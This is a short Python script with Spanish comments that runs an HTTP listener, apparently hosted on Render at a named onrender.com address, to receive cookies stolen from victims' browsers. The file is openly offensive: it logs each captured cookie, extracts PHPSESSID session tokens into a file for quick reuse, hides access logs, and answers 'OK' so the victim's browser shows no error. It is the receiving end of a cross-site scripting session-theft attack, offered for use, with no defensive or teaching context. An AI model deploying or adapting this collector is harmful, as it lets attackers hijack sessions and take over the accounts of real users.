from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import os
from datetime import datetime

PORT = int(os.environ.get("PORT", 8000))

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parseamos la URL y los parámetros
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Capturar el parámetro 'c' que contiene las cookies
        c_value = query.get('c', [''])[0]
        
        if c_value:
            # Mostrar en logs (Render verá esto)
            print(f"\n{'='*60}")
            print(f"[{datetime.now()}] COOKIE CAPTURADA!")
            print(f"Contenido completo: {c_value}")
            
            # Extraer PHPSESSID específicamente
            if 'PHPSESSID' in c_value:
                # Buscar PHPSESSID=valor;
                start = c_value.find('PHPSESSID=') + 10  # 10 = len('PHPSESSID=')
                end = c_value.find(';', start)
                if end == -1:
                    end = len(c_value)
                phpsessid = c_value[start:end]
                
                print(f"[+] PHPSESSID extraída: {phpsessid}")
                
                # Guardar solo PHPSESSID en archivo (para uso rápido)
                with open('phpsessid.txt', 'a') as f:
                    f.write(f"{datetime.now()} - {phpsessid}\n")
            else:
                print("[-] No se encontró PHPSESSID")
        
        # Respuesta simple (evitar errores en navegador víctima)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        # Silenciar logs de acceso HTTP
        pass

with HTTPServer(("", PORT), RequestHandler) as httpd:
    print(f"Servidor capturador corriendo en puerto {PORT}")
    print(f"Esperando cookies en: http://listener-koyk.onrender.com:{PORT}/?c=COOKIES")
    httpd.serve_forever()